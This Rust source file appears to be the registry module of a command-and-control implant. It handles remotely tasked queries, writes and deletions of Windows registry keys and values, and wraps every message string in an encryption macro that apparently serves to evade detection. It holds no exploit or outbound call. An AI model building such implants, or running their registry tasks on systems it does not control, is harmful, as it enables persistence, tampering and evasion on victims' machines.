use std::slice::from_raw_parts;

use serde::Serialize;
use shared::{
    stomped_structs::RegQueryResult,
    task_types::{RegAddInner, RegQueryInner, RegType},
    tasks::WyrmResult,
};
use str_crypter::{decrypt_string, sc};
use windows_registry::{CLASSES_ROOT, CURRENT_USER, Key, LOCAL_MACHINE, Transaction, USERS, Value};

use crate::utils::console::print_failed;

pub fn reg_query(raw_input: &Option<String>) -> Option<impl Serialize> {
    let input_deser = match raw_input {
        Some(s) => match serde_json::from_str::<RegQueryInner>(s) {
            Ok(s) => s,
            Err(e) => {
                return Some(WyrmResult::Err(format!(
                    "{} {e}",
                    sc!("Error deserialising query data.", 19).unwrap(),
                )));
            }
        },
        None => {
            return Some(WyrmResult::Err(format!(
                "{}",
                sc!(
                    "No query data received, cannot continue executing task.",
                    42
                )
                .unwrap(),
            )));
        }
    };

    // Check if we have 2 args
    if let Some(val) = input_deser.1 {
        return query_key_plus_value(input_deser.0, val);
    } else {
        return query_key(input_deser.0);
    }
}

pub fn reg_del(raw_input: &Option<String>) -> Option<impl Serialize> {
    let input_deser = match raw_input {
        Some(s) => match serde_json::from_str::<RegQueryInner>(s) {
            Ok(s) => s,
            Err(e) => {
                return Some(WyrmResult::Err(format!(
                    "{} {e}",
                    sc!("Error deserialising query data.", 19).unwrap(),
                )));
            }
        },
        None => {
            return Some(WyrmResult::Err(format!(
                "{}",
                sc!("No data on inner field, cannot continue with task.", 19).unwrap(),
            )));
        }
    };

    // Check if we have 2 args
    if let Some(val) = input_deser.1 {
        return delete_reg_value(input_deser.0, val);
    } else {
        return delete_key(input_deser.0);
    }
}

pub fn reg_add(raw_input: &Option<String>) -> Option<impl Serialize> {
    let (path, value, data, reg_type) = match raw_input {
        Some(s) => match serde_json::from_str::<RegAddInner>(s) {
            Ok(s) => s,
            Err(e) => {
                return Some(WyrmResult::Err(format!(
                    "{} {e}",
                    sc!("Error deserialising query data.", 19).unwrap(),
                )));
            }
        },
        None => {
            return Some(WyrmResult::Err(format!(
                "{}",
                sc!("No query data cannot continue with task.", 19).unwrap(),
            )));
        }
    };

    let (opened, path_stripped) = match get_key_strip_hive(&path) {
        Some((k, p)) => (k, p),
        None => {
            return Some(WyrmResult::Err::<String>(
                sc!("Bad data - could not find matching hive.", 162).unwrap(),
            ));
        }
    };

    //
    // Do the operation
    //
    if let Ok(tx) = Transaction::new() {
        // Try open the key
        let opened = match opened
            .options()
            .read()
            .write()
            .create()
            .transaction(&tx)
            .open(&path_stripped)
        {
            Ok(o) => o,
            Err(e) => {
                return Some(WyrmResult::Err::<String>(format!(
                    "{} {e}",
                    sc!("Could not open key as read/write.", 162).unwrap()
                )));
            }
        };

        // Set the value depending on the input type
        let reg_set_op_res = match reg_type {
            RegType::String => opened.set_string(&value, data.clone()),
            RegType::U32 => {
                let data_u32: u32 = match data.clone().parse() {
                    Ok(d) => d,
                    Err(e) => {
                        return Some(WyrmResult::Err::<String>(format!(
                            "{} {e}",
                            sc!("Could not parse input to u64.", 162).unwrap()
                        )));
                    }
                };
                opened.set_u32(&value, data_u32)
            }
            RegType::U64 => {
                let data_u64: u64 = match data.clone().parse() {
                    Ok(d) => d,
                    Err(e) => {
                        return Some(WyrmResult::Err::<String>(format!(
                            "{} {e}",
                            sc!("Could not parse input to u64.", 162).unwrap()
                        )));
                    }
                };
                opened.set_u64(&value, data_u64)
            }
        };

        // Check if the above was successful
        if let Err(e) = reg_set_op_res {
            return Some(WyrmResult::Err::<String>(format!(
                "{} {path} {value} {e}",
                sc!("Error whilst trying to set registry value.", 162).unwrap()
            )));
        }

        // Make the transaction
        if let Err(e) = tx.commit() {
            return Some(WyrmResult::Err::<String>(format!(
                "{} {e}",
                sc!("Error committing registry transaction.", 167).unwrap()
            )));
        }

        return Some(WyrmResult::Ok::<String>(
            sc!("Successfully modified registry.", 135).unwrap(),
        ));
    }

    return Some(WyrmResult::Err::<String>(
        sc!("Could not create transaction.", 168).unwrap(),
    ));
}

fn query_key_plus_value(path: String, value: String) -> Option<WyrmResult<String>> {
    //
    // Try open the hive, in the event of an error - return
    //
    let (key, path_stripped) = match get_key_strip_hive(&path) {
        Some((k, p)) => (k, p),
        None => {
            return Some(WyrmResult::Err::<String>(
                sc!("Bad data - could not find matching hive.", 162).unwrap(),
            ));
        }
    };

    let open_key = match key.open(path_stripped) {
        Ok(k) => k,
        Err(e) => {
            let msg = format!("{} {path}. {e}", sc!("Could not open key.", 19).unwrap());

            #[cfg(debug_assertions)]
            print_failed(&msg);

            return Some(WyrmResult::Err(msg));
        }
    };

    let val_str = match open_key.get_value(&value) {
        Ok(v) => value_to_string(&v),
        Err(e) => {
            let msg = format!(
                "{} {path} {value}. {e}",
                sc!("Could not open key/value.", 19).unwrap()
            );

            return Some(WyrmResult::Err(msg));
        }
    };

    Some(WyrmResult::Ok(val_str))
}

fn query_key(path: String) -> Option<WyrmResult<String>> {
    //
    // Try open the hive, in the event of an error - return
    //
    let (key, path_stripped) = match get_key_strip_hive(&path) {
        Some((k, p)) => (k, p),
        None => {
            return Some(WyrmResult::Err::<String>(
                sc!("Bad data - could not find matching hive.", 162).unwrap(),
            ));
        }
    };

    let open_key = match key.open(path_stripped) {
        Ok(k) => k,
        Err(e) => {
            let msg = format!("{} {path} - {e}", sc!("Could not open key.", 19).unwrap());

            return Some(WyrmResult::Err(msg));
        }
    };

    //
    // As we are querying the keys/values themselves, we need to iterate through it
    //
    let mut constructed_result = RegQueryResult::default();

    if let Ok(keys) = open_key.keys() {
        for k in keys {
            constructed_result.subkeys.push(k.clone());
        }
    }

    // We got the values, so iterate them - we need to reconstruct everything as a string to send back
    if let Ok(vals) = open_key.values() {
        for (name, data) in vals {
            let mut data_as_str = value_to_string(&data);
            let name = if name.is_empty() {
                "(default)".to_string()
            } else {
                name
            };

            if data_as_str.is_empty() {
                data_as_str = String::from("(empty)");
            }

            constructed_result
                .values
                .insert(name.clone(), data_as_str.clone());
        }
    }

    if constructed_result.subkeys.is_empty() && constructed_result.values.is_empty() {
        return Some(WyrmResult::Ok(sc!("No data in key.", 71).unwrap()));
    }

    match serde_json::to_string(&constructed_result) {
        Ok(s) => Some(WyrmResult::Ok(s)),
        Err(e) => {
            let msg = format!("{}. {e}", sc!("Could not serialise data.", 84).unwrap());
            Some(WyrmResult::Err(msg))
        }
    }
}

fn value_to_string(data: &Value) -> String {
    match data.ty() {
        windows_registry::Type::U32 => val_u32_to_str(&data),
        windows_registry::Type::U64 => val_u64_to_str(&data),
        windows_registry::Type::String => val_string_to_str(&data.to_vec()),
        windows_registry::Type::ExpandString => val_string_to_str(&data.to_vec()),
        windows_registry::Type::MultiString => val_string_to_str(&data.to_vec()),
        windows_registry::Type::Bytes => val_bytes_to_str(&data),
        windows_registry::Type::Other(_) => String::from("Not implemented"),
    }
}

fn val_u32_to_str(value: &Value) -> String {
    u32::from_le_bytes(value[0..4].try_into().unwrap()).to_string()
}

fn val_u64_to_str(value: &Value) -> String {
    u64::from_le_bytes(value[0..8].try_into().unwrap()).to_string()
}

fn val_bytes_to_str(value: &Value) -> String {
    let mut builder = String::new();
    for b in value.to_vec() {
        builder.push_str(&format!("{b:#X}, "));
    }

    // Trim the last whitespace + comma
    let len = builder.len();
    let builder = builder[0..len - 2].to_string();

    builder
}

fn val_string_to_str(value: &[u8]) -> String {
    if value.len() < 2 {
        return String::new();
    }

    let u16_slice = unsafe { from_raw_parts(value.as_ptr() as *const u16, value.len() / 2) };
    String::from_utf16_lossy(u16_slice)
}

fn strip_hive<'a>(path: &'a str) -> Result<&'a str, RegistryError> {
    let hive = match path.split_once(r"\") {
        Some(s) => s.1,
        None => return Err(RegistryError::CannotExtractKey),
    };

    Ok(hive)
}

/// Gets the hive from a given input str
fn extract_hive_from_str<'a>(path: &'a str) -> Result<&'a Key, RegistryError> {
    let hive = match path.split_once(r"\") {
        Some(s) => s.0,
        None => return Err(RegistryError::CannotExtractKey),
    };

    let key = match hive {
        "HKCU" => CURRENT_USER,
        "HKEY_CURRENT_USER" => CURRENT_USER,
        "HKLM" => LOCAL_MACHINE,
        "HKEY_LOCAL_MACHINE" => LOCAL_MACHINE,
        "HKCR" => CLASSES_ROOT,
        "HKEY_CLASSES_ROOT" => CLASSES_ROOT,
        "HKU" => USERS,
        "HKEY_USERS" => USERS,
        _ => return Err(RegistryError::CannotExtractKey),
    };

    Ok(key)
}

pub enum RegistryError {
    CannotExtractKey,
}

fn get_key_strip_hive<'a>(path: &'a str) -> Option<(&'a Key, &'a str)> {
    let key = match extract_hive_from_str(path) {
        Ok(k) => k,
        Err(_) => return None,
    };

    let path_stripped = match strip_hive(path) {
        Ok(p) => p,
        Err(_) => {
            return None;
        }
    };

    Some((key, path_stripped))
}

fn delete_key(path: String) -> Option<WyrmResult<String>> {
    //
    // Try open the hive, in the event of an error - return
    //
    let (key, path_stripped) = match get_key_strip_hive(&path) {
        Some((k, p)) => (k, p),
        None => {
            return Some(WyrmResult::Err::<String>(
                sc!("Bad data - could not find matching hive.", 162).unwrap(),
            ));
        }
    };

    if let Err(e) = key.remove_tree(path_stripped) {
        return Some(WyrmResult::Err::<String>(format!(
            "{} {path}. {e}",
            sc!("Could not delete key, searching for: ", 162).unwrap(),
        )));
    };

    return Some(WyrmResult::Ok::<String>(sc!("Deleted key.", 162).unwrap()));
}

fn delete_reg_value(path: String, value: String) -> Option<WyrmResult<String>> {
    //
    // Try open the hive, in the event of an error - return
    //
    let (key, path_stripped) = match get_key_strip_hive(&path) {
        Some((k, p)) => (k, p),
        None => {
            return Some(WyrmResult::Err::<String>(
                sc!("Bad data - could not find matching hive.", 162).unwrap(),
            ));
        }
    };

    let open_key = match key.options().read().write().open(path_stripped) {
        Ok(k) => k,
        Err(e) => {
            let msg = format!("{} {path} - {e}", sc!("Could not open key.", 19).unwrap());

            return Some(WyrmResult::Err(msg));
        }
    };

    if let Err(e) = open_key.remove_value(value) {
        return Some(WyrmResult::Err::<String>(format!(
            "{} {e}",
            sc!("Could not delete key. Error: ", 162).unwrap(),
        )));
    };

    return Some(WyrmResult::Ok::<String>(sc!("Deleted key.", 162).unwrap()));
}
